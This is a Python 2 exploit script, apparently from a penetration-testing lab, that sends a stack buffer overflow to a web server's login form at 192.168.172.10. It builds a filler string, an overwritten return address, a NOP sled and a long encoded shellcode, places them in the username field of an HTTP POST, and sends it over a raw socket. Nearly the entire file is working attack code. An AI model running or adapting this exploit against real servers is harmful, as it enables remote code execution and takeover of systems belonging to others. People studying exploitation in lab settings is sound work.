#!/usr/bin/env python
import socket
import sys



filler = "A" * 780
eip = "\x83\x0c\x09\x10" 
offset = "C" * 4
nops = "\x90" * 10
shellcode = ("\xbe\x58\xd3\x28\xa0\xdb\xc9\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x83\xc0\x04\x31\x70\x0e\x03\x28\xdd\xca\x55\x34\x09\x88"
"\x96\xc4\xca\xed\x1f\x21\xfb\x2d\x7b\x22\xac\x9d\x0f\x66\x41"
"\x55\x5d\x92\xd2\x1b\x4a\x95\x53\x91\xac\x98\x64\x8a\x8d\xbb"
"\xe6\xd1\xc1\x1b\xd6\x19\x14\x5a\x1f\x47\xd5\x0e\xc8\x03\x48"
"\xbe\x7d\x59\x51\x35\xcd\x4f\xd1\xaa\x86\x6e\xf0\x7d\x9c\x28"
"\xd2\x7c\x71\x41\x5b\x66\x96\x6c\x15\x1d\x6c\x1a\xa4\xf7\xbc"
"\xe3\x0b\x36\x71\x16\x55\x7f\xb6\xc9\x20\x89\xc4\x74\x33\x4e"
"\xb6\xa2\xb6\x54\x10\x20\x60\xb0\xa0\xe5\xf7\x33\xae\x42\x73"
"\x1b\xb3\x55\x50\x10\xcf\xde\x57\xf6\x59\xa4\x73\xd2\x02\x7e"
"\x1d\x43\xef\xd1\x22\x93\x50\x8d\x86\xd8\x7d\xda\xba\x83\xe9"
"\x2f\xf7\x3b\xea\x27\x80\x48\xd8\xe8\x3a\xc6\x50\x60\xe5\x11"
"\x96\x5b\x51\x8d\x69\x64\xa2\x84\xad\x30\xf2\xbe\x04\x39\x99"
"\x3e\xa8\xec\x0e\x6e\x06\x5f\xef\xde\xe6\x0f\x87\x34\xe9\x70"
"\xb7\x37\x23\x19\x52\xc2\xa4\xe6\x0b\xbb\x98\x8f\x49\x43\xc3"
"\xf7\xc7\xa5\x69\x18\x8e\x7e\x06\x81\x8b\xf4\xb7\x4e\x06\x71"
"\xf7\xc5\xa5\x86\xb6\x2d\xc3\x94\x2f\xde\x9e\xc6\xe6\xe1\x34"
"\x6e\x64\x73\xd3\x6e\xe3\x68\x4c\x39\xa4\x5f\x85\xaf\x58\xf9"
"\x3f\xcd\xa0\x9f\x78\x55\x7f\x5c\x86\x54\xf2\xd8\xac\x46\xca"
"\xe1\xe8\x32\x82\xb7\xa6\xec\x64\x6e\x09\x46\x3f\xdd\xc3\x0e"
"\xc6\x2d\xd4\x48\xc7\x7b\xa2\xb4\x76\xd2\xf3\xcb\xb7\xb2\xf3"
"\xb4\xa5\x22\xfb\x6f\x6e\x52\xb6\x2d\xc7\xfb\x1f\xa4\x55\x66"
"\xa0\x13\x99\x9f\x23\x91\x62\x64\x3b\xd0\x67\x20\xfb\x09\x1a"
"\x39\x6e\x2d\x89\x3a\xbb")

try:
    print "\nSending evil buffer"
 
    inputBuffer = filler + eip + offset + nops + shellcode 
    
    content = "username=" + inputBuffer+ "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.172.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.172.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    buffer += content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.172.10", 80))
    s.send(buffer)
    s.close

except:
    print "Could not connect"
    sys.exit()
